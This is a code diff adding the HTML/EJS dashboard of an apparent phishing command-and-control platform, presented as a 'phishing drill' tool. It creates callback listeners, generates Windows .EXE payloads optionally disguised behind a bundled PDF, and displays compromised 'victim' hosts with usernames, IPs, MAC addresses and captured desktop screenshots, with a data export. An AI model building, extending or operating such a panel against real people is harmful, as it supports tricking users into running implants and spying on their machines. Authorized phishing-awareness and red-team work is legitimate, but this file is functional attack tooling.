@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>控制台 - 凌曦安全钓鱼演练平台</title>
+    <link rel="icon" type="image/x-icon" href="/logo.ico">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Source+Code+Pro:wght@400;600&display=swap');
+
+        :root {
+            --bg-color: #0a0e17;
+            --surface-color: rgba(28, 30, 39, 0.7);
+            --glass-border: rgba(100, 116, 139, 0.3);
+            --accent-color: #00f6ff;
+            --accent-hover: #67fdff;
+            --danger-color: #ff4757;
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --font-primary: 'Roboto', sans-serif;
+            --font-mono: 'Source Code Pro', monospace;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background-color: var(--bg-color); color: var(--text-primary); font-family: var(--font-primary); font-size: 14px; line-height: 1.6; overflow-x: hidden; }
+
+        /* 动态背景 */
+        .background-grid {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: linear-gradient(rgba(100, 116, 139, 0.08) 1px, transparent 1px), linear-gradient(90deg, rgba(100, 116, 139, 0.08) 1px, transparent 1px);
+            background-size: 30px 30px; z-index: -1; animation: pan 60s linear infinite;
+        }
+        @keyframes pan { 0% { background-position: 0 0; } 100% { background-position: 1200px 600px; } }
+
+        .monospace { font-family: var(--font-mono); }
+
+        /* 布局 */
+        .main-header { position: sticky; top: 0; display: flex; justify-content: space-between; align-items: center; padding: 1rem 2rem; background: var(--surface-color); backdrop-filter: blur(10px); border-bottom: 1px solid var(--glass-border); z-index: 100; }
+        .logo h1 { font-size: 1.5rem; font-weight: 700; color: var(--accent-color); text-shadow: 0 0 5px var(--accent-color); }
+        
+        .main-container { display: flex; gap: 2rem; padding: 2rem; }
+        .control-sidebar { width: 360px; flex-shrink: 0; display: flex; flex-direction: column; gap: 2rem; }
+        .data-content { flex-grow: 1; }
+        
+        .card { background: var(--surface-color); border: 1px solid var(--glass-border); border-radius: 8px; padding: 1.5rem; backdrop-filter: blur(10px); }
+        .control-section h2 { font-size: 1.1rem; color: var(--text-secondary); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; text-transform: uppercase; letter-spacing: 1px; }
+        .icon { color: var(--accent-color); }
+
+        /* 输入控件 */
+        .control-form label { display: block; font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 0.4rem; }
+        .control-form input, .control-form select { width: 100%; background-color: rgba(10, 14, 23, 0.5); border: 1px solid var(--glass-border); border-radius: 4px; padding: 0.6rem; color: var(--text-primary); margin-bottom: 1rem; font-family: var(--font-mono); font-size: 0.9rem; }
+        .control-form input:focus { outline: none; border-color: var(--accent-color); }
+        
+        .btn { display: block; width: 100%; padding: 0.7rem; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; transition: all 0.2s; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px; }
+        .btn-primary { background: var(--accent-color); color: #000; box-shadow: 0 0 10px rgba(0, 246, 255, 0.2); }
+        .btn-primary:hover { background: var(--accent-hover); box-shadow: 0 0 20px rgba(0, 246, 255, 0.5); }
+        .btn-danger { background: rgba(255, 71, 87, 0.1); color: var(--danger-color); border: 1px solid var(--danger-color); }
+        .btn-danger:hover { background: var(--danger-color); color: #fff; }
+        .btn-logout { width: auto; background: transparent; border: 1px solid var(--glass-border); color: var(--text-secondary); padding: 0.4rem 1rem; }
+
+        /* 列表 */
+        #listener-list { list-style: none; max-height: 150px; overflow-y: auto; }
+        .list-item { display: flex; justify-content: space-between; padding: 0.5rem; background: rgba(10,14,23,0.3); border-radius: 4px; margin-bottom: 5px; font-family: var(--font-mono); font-size: 0.85rem; }
+        .btn-icon { background: none; border: none; color: var(--text-secondary); cursor: pointer; font-size: 1.1em; }
+        .btn-icon:hover { color: var(--danger-color); }
+
+        .data-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; }
+        #victim-count { background: rgba(0, 246, 255, 0.1); color: var(--accent-color); padding: 0.2rem 0.8rem; border-radius: 20px; border: 1px solid rgba(0, 246, 255, 0.3); font-family: var(--font-mono); font-size: 0.85rem; }
+
+        /* --- 全新设计的受害者卡片 --- */
+        #victims-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 1.5rem; }
+
+        .victim-card {
+            background: rgba(30, 32, 40, 0.85);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex; flex-direction: column;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        .victim-card::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 3px;
+            background: linear-gradient(90deg, var(--accent-color), transparent);
+            opacity: 0.5;
+        }
+        .victim-card.visible { animation: slideIn 0.4s ease-out forwards; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .victim-card:hover { border-color: rgba(0, 246, 255, 0.4); box-shadow: 0 5px 20px rgba(0,0,0,0.3); transform: translateY(-2px); }
+
+        /* 卡片头部 */
+        .card-header {
+            padding: 1rem 1.2rem;
+            background: rgba(255, 255, 255, 0.02);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .host-info h3 { font-size: 1rem; color: #fff; font-weight: 600; display: flex; align-items: center; gap: 8px; }
+        .status-dot { width: 6px; height: 6px; background: #00ff9d; border-radius: 50%; box-shadow: 0 0 6px #00ff9d; }
+        .timestamp { font-size: 0.75rem; color: var(--text-secondary); font-family: var(--font-mono); margin-top: 2px; }
+
+        /* 卡片内容区 */
+        .card-body { padding: 1.2rem; }
+
+        /* 基础信息网格 (2列) */
+        .info-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.2rem;
+        }
+        .info-item { display: flex; flex-direction: column; }
+        .info-label { font-size: 0.7rem; text-transform: uppercase; color: var(--text-secondary); letter-spacing: 0.5px; margin-bottom: 2px; }
+        .info-val { font-size: 0.95rem; color: #e2e8f0; font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .info-val.accent { color: var(--accent-color); font-family: var(--font-mono); }
+
+        /* 网络接口区域 (独立块) */
+        .network-section { margin-top: 0.5rem; }
+        .net-label { display: block; font-size: 0.7rem; text-transform: uppercase; color: var(--text-secondary); margin-bottom: 0.5rem; letter-spacing: 0.5px; }
+        
+        .net-container {
+            background: #0f1117;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 4px;
+            padding: 0.5rem;
+        }
+        
+        .net-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 4px 6px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            font-family: var(--font-mono); font-size: 0.8rem;
+        }
+        .net-row:last-child { border-bottom: none; }
+        
+        .mac-badge {
+            background: #1e293b; color: #94a3b8;
+            padding: 1px 6px; border-radius: 3px;
+            font-size: 0.75rem;
+        }
+        .ip-text { color: #e2e8f0; }
+
+        /* 开关样式 */
+        .toggle-switch { position: relative; display: inline-block; width: 36px; height: 18px; margin-right: 10px; }
+        .toggle-switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #334155; transition: .4s; border-radius: 18px; }
+        .slider:before { position: absolute; content: ""; height: 14px; width: 14px; left: 2px; bottom: 2px; background-color: #94a3b8; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: rgba(0, 246, 255, 0.3); }
+        input:checked + .slider:before { transform: translateX(18px); background-color: var(--accent-color); }
+        .toggle-group { display: flex; align-items: center; margin-bottom: 1rem; }
+
+        .spinner { border: 2px solid var(--glass-border); border-top-color: var(--accent-color); border-radius: 50%; width: 24px; height: 24px; animation: spin 0.8s linear infinite; margin: 10px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        #no-victims-placeholder { text-align: center; padding: 4rem; border: 2px dashed var(--glass-border); border-radius: 8px; color: var(--text-secondary); margin-top: 1rem; }
+
+        /* 截图模态框 */
+        .screenshot-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        .screenshot-modal.show {
+            display: flex;
+        }
+        .screenshot-content {
+            max-width: 90%;
+            max-height: 90%;
+            position: relative;
+        }
+        .screenshot-content img {
+            max-width: 100%;
+            max-height: 90vh;
+            border-radius: 8px;
+            box-shadow: 0 0 50px rgba(0, 246, 255, 0.3);
+        }
+        .screenshot-close {
+            position: absolute;
+            top: -40px;
+            right: 0;
+            background: var(--danger-color);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+        }
+        .screenshot-close:hover {
+            background: #ff6b7a;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-grid"></div>
+
+    <header class="main-header">
+        <div class="logo" style="display: flex; align-items: center; gap: 1rem;">
+            <div class="logo-container" style="width: 60px; height: 60px; position: relative;">
+                <img src="/logo.ico" alt="凌曦安全" style="width: 100%; height: 100%; object-fit: contain; filter: drop-shadow(0 0 8px rgba(0,246,255,0.2));">
+            </div>
+            <div>
+                <h1 style="margin: 0; font-size: 1.5rem;">凌曦安全</h1>
+                <p style="margin: 0; font-size: 0.75rem; color: var(--text-secondary); letter-spacing: 2px;">LINGXI SECURITY</p>
+                <p style="margin: 0; font-size: 0.65rem; color: var(--text-secondary); opacity: 0.7;">by Syst1m&nbsp;&nbsp;&nbsp;</p>
+            </div>
+        </div>
+        <nav class="main-nav" style="display: flex; gap: 1rem; align-items: center;">
+            <a href="https://www.yuque.com/syst1m-/blog/lc3k6elv0zqhdal3" target="_blank" class="btn" style="width: auto; padding: 0.5rem 1.5rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none; text-decoration: none; display: flex; align-items: center; gap: 0.5rem;">
+                <span>📚</span>
+                <span>凌曦安全课程介绍</span>
+            </a>
+            <form action="/logout" method="post">
+                <button type="submit" class="btn btn-logout">Logout</button>
+            </form>
+        </nav>
+    </header>
+
+    <main class="main-container">
+        <aside class="control-sidebar">
+            <div class="control-section">
+                <h2><span class="icon">📡</span> 监听器管理</h2>
+                <div class="card">
+                    <form action="/create_listener" method="post" class="control-form">
+                        <label>回连 IP (公网IP)</label>
+                        <input type="text" name="ip" placeholder="例如: 123.45.67.89" value="<%= serverPublicIP %>" required>
+                        <label>监听端口</label>
+                        <input type="number" name="port" value="9090" min="1" max="65535" required>
+                        <button type="submit" class="btn btn-primary">创建监听器</button>
+                    </form>
+                    <div class="divider" style="margin: 1.5rem 0; height:1px; background:var(--glass-border);"></div>
+                    <ul id="listener-list">
+                        <% if (Object.keys(listeners).length === 0) { %>
+                            <li style="text-align:center; color:var(--text-secondary); padding:10px;">暂无活动监听器</li>
+                        <% } else { %>
+                            <% for (const [id, listener] of Object.entries(listeners)) { %>
+                            <li class="list-item">
+                                <span><%= listener.connect_ip %>:<%= listener.port %></span>
+                                <form action="/delete_listener" method="post">
+                                    <input type="hidden" name="listener_id" value="<%= id %>">
+                                    <button type="submit" class="btn-icon">&times;</button>
+                                </form>
+                            </li>
+                            <% } %>
+                        <% } %>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="control-section">
+                <h2><span class="icon">📦</span> 载荷生成</h2>
+                <div class="card">
+                    <form id="generate-form" action="/generate_exe" method="post" enctype="multipart/form-data" class="control-form">
+                        <label>选择监听器</label>
+                        <select name="listener_id" id="payload_listener" required>
+                            <% if (Object.keys(listeners).length > 0) { %>
+                                <% for (const [id, listener] of Object.entries(listeners)) { %>
+                                <option value="<%= id %>"><%= listener.connect_ip %>:<%= listener.port %></option>
+                                <% } %>
+                            <% } else { %>
+                                <option disabled selected value="">请先创建监听器</option>
+                            <% } %>
+                        </select>
+                        <div class="toggle-group">
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="include_pdf" name="include_pdf">
+                                <span class="slider"></span>
+                            </label>
+                            <span style="color: var(--text-secondary); font-size: 0.85rem;">捆绑并打开 PDF</span>
+                        </div>
+                        <div id="pdf-upload-group" style="display: none;">
+                            <input type="file" id="pdf_file" name="pdf_file" accept=".pdf">
+                        </div>
+                        <button type="submit" class="btn btn-primary" id="generate-btn">生成 .EXE</button>
+                        <div id="loading-spinner" class="spinner" style="display: none;"></div>
+                    </form>
+                </div>
+            </div>
+
+            <div class="control-section">
+                 <div class="card" style="padding: 1rem;">
+                     <form action="/clear_data" method="post" onsubmit="return confirm('确定要清空所有数据吗？');">
+                        <button type="submit" class="btn btn-danger" style="font-size:0.8rem; padding:0.5rem;">清空已上线主机</button>
+                    </form>
+                </div>
+            </div>
+        </aside>
+
+        <section class="data-content">
+            <div class="data-header">
+                <h2>已上线主机</h2>
+                <div style="display: flex; gap: 1rem; align-items: center;">
+                    <div id="victim-count">0 Online</div>
+                    <a href="/export_victims" class="btn btn-primary" style="width: auto; padding: 0.4rem 1rem; font-size: 0.85rem; text-decoration: none; display: flex; align-items: center; gap: 0.5rem;">
+                        <span>📥</span>
+                        <span>导出数据</span>
+                    </a>
+                </div>
+            </div>
+            <div id="victims-grid">
+                <div id="no-victims-placeholder" <% if (victims && victims.length > 0) { %>style="display:none;"<% } %>>
+                    <div style="font-size: 2rem; margin-bottom: 10px; opacity:0.5;">Target Aquired?</div>
+                    <p>等待 Beacon 上线...</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- 截图查看模态框 -->
+    <div class="screenshot-modal" id="screenshot-modal">
+        <div class="screenshot-content">
+            <button class="screenshot-close" id="close-screenshot">✕ 关闭</button>
+            <img id="screenshot-image" src="" alt="截图">
+        </div>
+    </div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+
+    const includePdfCheckbox = document.getElementById('include_pdf');
+    const pdfUploadGroup = document.getElementById('pdf-upload-group');
+    const generateForm = document.getElementById('generate-form');
+    const generateBtn = document.getElementById('generate-btn');
+    const loadingSpinner = document.getElementById('loading-spinner');
+
+    includePdfCheckbox.addEventListener('change', function () {
+        pdfUploadGroup.style.display = this.checked ? 'block' : 'none';
+        document.getElementById('pdf_file').required = this.checked;
+    });
+
+    generateForm.addEventListener('submit', function(e) {
+        const listenerSelect = document.getElementById('payload_listener');
+        if (!listenerSelect.value || listenerSelect.value === "") {
+            e.preventDefault();
+            alert('请先创建并选择一个监听器！');
+            return;
+        }
+        generateBtn.style.display = 'none';
+        loadingSpinner.style.display = 'block';
+        setTimeout(() => {
+            generateBtn.style.display = 'block';
+            loadingSpinner.style.display = 'none';
+        }, 3000);
+    });
+
+    const victimsGrid = document.getElementById('victims-grid');
+    const placeholder = document.getElementById('no-victims-placeholder');
+    const victimCountEl = document.getElementById('victim-count');
+    let currentVictimIds = new Set(Array.from(document.querySelectorAll('.victim-card')).map(card => card.dataset.id));
+
+    function parsePublicIp(rawInfo) {
+        if (!rawInfo || rawInfo === 'N/A') return 'N/A';
+        const ipMatch = rawInfo.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/);
+        if (ipMatch) return ipMatch[0];
+        return rawInfo.substring(0, 15) + '...';
+    }
+
+    function parseNetworkInfo(rawNet) {
+        if (!rawNet || rawNet.includes('No Active') || rawNet === 'Unknown') return [];
+        const adapters = rawNet.split('|').map(item => item.trim());
+        const parsed = [];
+        adapters.forEach(adapter => {
+            const match = adapter.match(/\[(.*?)\]\s*(.*)/);
+            if (match) parsed.push({ mac: match[1], ips: match[2] });
+            else parsed.push({ mac: 'Unknown', ips: adapter });
+        });
+        return parsed;
+    }
+
+    function createVictimCard(victim) {
+        const card = document.createElement('div');
+        card.className = 'victim-card';
+        card.dataset.id = victim.id;
+
+        const d = victim.data;
+        const cleanPublicIp = parsePublicIp(d['公网IP']);
+        const adapters = parseNetworkInfo(d['内网IP']);
+        const fullTime = d['上线时间']; 
+
+        let networkHtml = '';
+        if (adapters.length > 0) {
+            // 独立的网络区域，Label在上方，内容在下方黑框
+            networkHtml = `
+            <div class="network-section">
+                <span class="net-label">Interfaces</span>
+                <div class="net-container">`;
+            adapters.forEach(a => {
+                networkHtml += `
+                    <div class="net-row">
+                        <span class="mac-badge">${a.mac}</span>
+                        <span class="ip-text">${a.ips}</span>
+                    </div>
+                `;
+            });
+            networkHtml += `</div></div>`;
+        } else {
+            networkHtml = `<div class="info-grid" style="margin-bottom:0;"><div class="info-item"><span class="info-label">Internal IP</span><span class="info-val">${d['内网IP'] || 'Unknown'}</span></div></div>`;
+        }
+
+        card.innerHTML = `
+            <div class="card-header">
+                <div class="host-info">
+                    <h3><span class="status-dot"></span> ${d['主机名'] || 'Unknown'}</h3>
+                    <div class="timestamp">${fullTime}</div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <div class="os-icon">
+                       <!-- Windows Logo Placeholder -->
+                       <span style="font-size:1.2rem;">🪟</span>
+                    </div>
+                    <button class="btn-delete-victim" data-victim-id="${victim.id}" style="background: rgba(255,71,87,0.1); border: 1px solid var(--danger-color); color: var(--danger-color); padding: 4px 12px; border-radius: 4px; cursor: pointer; font-size: 0.85rem;" title="删除此主机">
+                        🗑️ 删除
+                    </button>
+                </div>
+            </div>
+            <div class="card-body">
+                <div class="info-grid">
+                    <div class="info-item">
+                        <span class="info-label">Current User</span>
+                        <span class="info-val">${d['用户名']}</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Public IP</span>
+                        <span class="info-val accent" title="${d['公网IP']}">${cleanPublicIp}</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">OS Version</span>
+                        <span class="info-val" style="font-family:var(--font-mono); font-size:0.85rem;">${d['系统版本'] || 'Unknown'}</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">Uptime</span>
+                        <span class="info-val" style="font-family:var(--font-mono); font-size:0.85rem;">${d['运行时间']}</span>
+                    </div>
+                </div>
+                
+                <!-- 截图信息 -->
+                ${(d['截图文件'] && d['截图文件'] !== '') || (d['截图路径'] && d['截图路径'] !== 'N/A' && d['截图路径'] !== 'Screenshot-Failed' && d['截图路径'] !== 'Screenshot-Error') ? `
+                <div style="margin-top: 12px; padding: 10px; background: rgba(0, 246, 255, 0.05); border: 1px solid rgba(0, 246, 255, 0.2); border-radius: 5px;">
+                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 5px;">
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <span style="font-size: 1.2rem;">📸</span>
+                            <span style="color: var(--accent-color); font-weight: 600; font-size: 0.9rem;">桌面截图已捕获</span>
+                        </div>
+                        ${d['截图文件'] ? `
+                        <button class="btn-view-screenshot" data-screenshot="/screenshots/${d['截图文件']}" style="background: var(--accent-color); color: #000; border: none; padding: 5px 15px; border-radius: 4px; cursor: pointer; font-size: 0.85rem; font-weight: 600;">
+                            查看截图
+                        </button>
+                        ` : ''}
+                    </div>
+                    <div style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-secondary); word-break: break-all;">
+                        ${d['截图文件'] ? '已上传: ' + d['截图文件'] : '本地路径: ' + (d['截图路径'] || 'Unknown')}
+                    </div>
+                    ${!d['截图文件'] ? `
+                    <div style="margin-top: 8px; font-size: 0.75rem; color: #ffa500;">
+                        ⚠️ 截图未上传到服务器（保存在目标主机）
+                    </div>
+                    ` : ''}
+                </div>
+                ` : d['截图路径'] === 'Screenshot-Failed' ? `
+                <div style="margin-top: 12px; padding: 10px; background: rgba(255, 71, 87, 0.05); border: 1px solid rgba(255, 71, 87, 0.2); border-radius: 5px;">
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <span style="font-size: 1.2rem;">⚠️</span>
+                        <span style="color: var(--danger-color); font-size: 0.85rem;">截图失败（可能权限不足）</span>
+                    </div>
+                </div>
+                ` : ''}
+                
+                ${networkHtml}
+            </div>
+        `;
+        return card;
+    }
+
+    async function fetchVictims() {
+        try {
+            const response = await fetch('/api/victims');
+            if (!response.ok) return;
+            const victims = await response.json();
+
+            victimCountEl.textContent = `${victims.length} Online`;
+            
+            const serverVictimIds = new Set(victims.map(v => v.id));
+            for (const id of currentVictimIds) {
+                if (!serverVictimIds.has(id)) {
+                    const card = victimsGrid.querySelector(`.victim-card[data-id="${id}"]`);
+                    if (card) card.remove();
+                    currentVictimIds.delete(id);
+                }
+            }
+            
+            if (victims.length === 0) placeholder.style.display = 'block';
+            else placeholder.style.display = 'none';
+
+            victims.forEach(victim => {
+                if (!currentVictimIds.has(victim.id)) {
+                    const card = createVictimCard(victim);
+                    victimsGrid.prepend(card);
+                    setTimeout(() => card.classList.add('visible'), 50);
+                    currentVictimIds.add(victim.id);
+                }
+            });
+        } catch (error) { console.error(error); }
+    }
+    
+    const initialVictims = <%- JSON.stringify(victims) %>;
+    if (initialVictims.length > 0) {
+        initialVictims.forEach(victim => {
+            const card = createVictimCard(victim);
+            victimsGrid.appendChild(card);
+            setTimeout(() => card.classList.add('visible'), 50);
+            currentVictimIds.add(victim.id);
+        });
+    }
+    
+    fetchVictims();
+    setInterval(fetchVictims, 5000);
+
+    // 删除单个主机事件委托
+    victimsGrid.addEventListener('click', async function(e) {
+        if (e.target.classList.contains('btn-delete-victim') || e.target.closest('.btn-delete-victim')) {
+            const btn = e.target.classList.contains('btn-delete-victim') ? e.target : e.target.closest('.btn-delete-victim');
+            const victimId = btn.dataset.victimId;
+            
+            if (confirm('确定要删除这台主机吗？')) {
+                try {
+                    const response = await fetch('/delete_victim', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `victim_id=${victimId}`
+                    });
+                    
+                    if (response.ok) {
+                        const card = victimsGrid.querySelector(`.victim-card[data-id="${victimId}"]`);
+                        if (card) {
+                            card.style.opacity = '0';
+                            setTimeout(() => {
+                                card.remove();
+                                currentVictimIds.delete(victimId);
+                                victimCountEl.textContent = `${currentVictimIds.size} Online`;
+                                if (currentVictimIds.size === 0) placeholder.style.display = 'block';
+                            }, 300);
+                        }
+                    }
+                } catch (error) {
+                    console.error('删除失败:', error);
+                    alert('删除失败，请重试');
+                }
+            }
+        }
+
+        // 查看截图
+        if (e.target.classList.contains('btn-view-screenshot')) {
+            const screenshotUrl = e.target.dataset.screenshot;
+            const modal = document.getElementById('screenshot-modal');
+            const img = document.getElementById('screenshot-image');
+            img.src = screenshotUrl;
+            modal.classList.add('show');
+        }
+    });
+
+    // 关闭截图模态框
+    document.getElementById('close-screenshot').addEventListener('click', function() {
+        document.getElementById('screenshot-modal').classList.remove('show');
+    });
+
+    // 点击模态框背景关闭
+    document.getElementById('screenshot-modal').addEventListener('click', function(e) {
+        if (e.target === this) {
+            this.classList.remove('show');
+        }
+    });
+});
+</script>
+</body>
+</html>
